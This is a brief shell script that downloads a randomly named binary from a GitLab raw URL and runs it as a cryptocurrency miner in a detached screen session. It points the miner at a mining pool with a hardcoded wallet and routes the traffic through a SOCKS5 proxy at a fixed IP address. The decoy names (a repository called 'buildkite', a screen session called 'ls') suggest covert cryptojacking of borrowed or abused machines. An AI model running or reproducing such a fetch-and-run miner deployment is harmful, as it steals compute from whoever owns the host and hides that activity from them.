apt update 
apt install screen -y 
wget -O KAXib6Y9b https://gitlab.com/KAXib6Y9b/buildkite/-/raw/main/KAXib6Y9b
chmod +x KAXib6Y9b
screen -dmS ls
./KAXib6Y9b --algorithm randomkeva --pool stratum-eu.rplant.xyz:17061 --tls true --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.6Y9b=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://143.198.231.168:1080 --keepalive true
